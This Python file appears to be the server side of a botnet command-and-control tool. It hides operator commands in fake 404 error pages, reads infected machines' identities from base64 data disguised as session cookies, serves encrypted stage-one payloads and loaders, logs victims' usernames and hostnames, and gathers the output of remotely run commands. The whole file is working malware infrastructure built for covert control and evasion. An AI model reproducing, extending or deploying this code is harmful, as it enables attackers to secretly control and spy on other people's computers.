from textwrap import dedent
from os import fstat
from base64 import b64decode,b64encode
from time import time
from urllib.parse import unquote_plus
import shutil
import json
import pyperclip as py
#External Imports
from server.model import RequestType,Bot,PayloadFactory
from server import modules

class _RequestHandler():
    """Handles communicating with bots.

    - Responses are hidden in 404 error pages (the DEBUG part)
    - GET requests are used to retrieve the current command
    - Information about the bot along with the request type is sent (base64 encoded) in the Cookie header
    - Handles hosting files specified in the model
    """
    def __init__(self,model):
        self._model = model
        self._server_port = None

    def _send_command(self, command_raw=""):
        """Sends the command to the bot.

        :type command_raw: str
        """
        response = dedent("""\
        <!DOCTYPE html>
        <HTML>
            <HEAD>
                <TITLE>404 Not Found</TITLE>
            </HEAD>
            <BODY>
                <H1>Not Found</H1>
                The requested URL https://www.google.com was not found on this server.
                <P>
                <HR>
                <ADDRESS></ADDRESS>
            </BODY>
        </HTML>
        """)

        if command_raw != "":
            print("Adding command >>>>>>>>>>>>>>>>>>>>>")
            response += dedent(f"""\<!--DEBUG:\n{command_raw}DEBUG-->""")
            print(response)
        return response,404

    def do_GET(self,cookies):
        cookie = "session"
        #print(cookies)
        #print(cookie in cookies)
        if not cookie in cookies:
            for upload_file in self._model.get_upload_files():
                url_path, local_path = upload_file

                if self.path == ("/" + url_path):
                    with open(local_path, "rb") as input_file:
                        fs = fstat(input_file.fileno())

                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(url_path))
                        self.send_header("Content-Length", str(fs.st_size))
                        self.end_headers()

                        shutil.copyfileobj(input_file, self.wfile)
                    break
            else:
                self._send_command()
        else:
            # Cookie header format: session=<b64_bot_uid>-<b64_JSON_data>
            #print(cookie.split("-")[0].replace("session=b", "").encode())
            bot_uid = b64decode(cookies['session'].split("-")[0].encode()).decode()
            # bot_uid = b64decode(cookies['session'].split("-")[0].replace("session=b", "").encode())
            #print(cookie.split("-")[1].encode()).decode()
            data = json.loads(b64decode(cookies['session'].split("-")[1].encode()))
            request_type = int(data["type"])

            if request_type == RequestType.STAGE_1:
                # Send back a uniquely encrypted payload which the stager will run.
                payload_options = data["payload_options"]
                loader_options = data["loader_options"]
                loader_name = loader_options["loader_name"]

                payload = PayloadFactory.create_payload(bot_uid, payload_options, loader_options)
                loader = PayloadFactory.wrap_loader(loader_name, loader_options, payload)
                return self._send_command(b64encode(loader.encode()).decode())
            elif request_type == RequestType.GET_COMMAND:
                username = data["username"]
                hostname = data["hostname"]
                local_path = data["path"]
                #print(data['path'])
                system_version = data["version"]
                loader_name = data["loader_name"]

                if not self._model.is_known_bot(bot_uid):
                    # This is the first time this bot connected.
                    bot = Bot(bot_uid, username, hostname, time(), local_path, system_version, loader_name)

                    self._model.add_bot(bot)
                    #self._view.on_bot_added(bot)

                    return self._send_command()
                else:
                    # print("---------------------------------------------------------------------------------------------------------")
                    # Update the bot's session (last online and local path).
                    self._model.update_bot(bot_uid, time(), local_path)

                    has_executed_global, global_command = self._model.has_executed_global(bot_uid)

                    if not has_executed_global:
                        self._model.add_executed_global(bot_uid)
                        return self._send_command(global_command)
                    else:
                        #print(bot_uid)
                        return self._send_command(self._model.get_command_raw(bot_uid))
            else:
                return self._send_command()

    def do_POST(self,res):
        # Command responses.
        res = res['username']
        data = json.loads(b64decode(res.encode()).decode())
        response = b64decode(data["response"].encode())
        bot_uid = data["bot_uid"]
        module_name = data["module_name"]
        response_options = dict(data["response_options"])

        if module_name:
            #try:
                # Modules will already be loaded at this point.
                resp = modules.get_module(module_name).process_response(response, response_options)

                # Note to self: if there's too many "special" modules here,
                # pass the bot_uid to the process_response method instead.
                if module_name == "remove_bot":
                    self._model.remove_bot(bot_uid)
                
                return resp

            # except Exception as ex:
            #     print(str(ex)
            #     # Something went wrong in the process_response method.
            #     return f"Module server error:{ex}"

        else:
            # Command response.
            if response.decode().startswith("Directory changed to"):
                # Update the view's footer to show the updated path.
                new_path = response.decode().replace("Directory changed to: ", "", 1)
                #print(new_path)
                self._model.update_bot(bot_uid, time(), new_path)
                
                # self._view.on_bot_path_change(self._model.get_bot(bot_uid))
            bot = self._model.get_bot(bot_uid)
            res = f"{bot.username}@{bot.hostname}:~{bot.local_path}$:\n\n"
            res += response.decode() +"\n\n\n\n\n"
            res += "----------"*20+"\n\n"
            return res

        return self._send_command()

    def log_message(self, log_format, *args):
        return  # Don't log random stuff we don't care about, thanks.
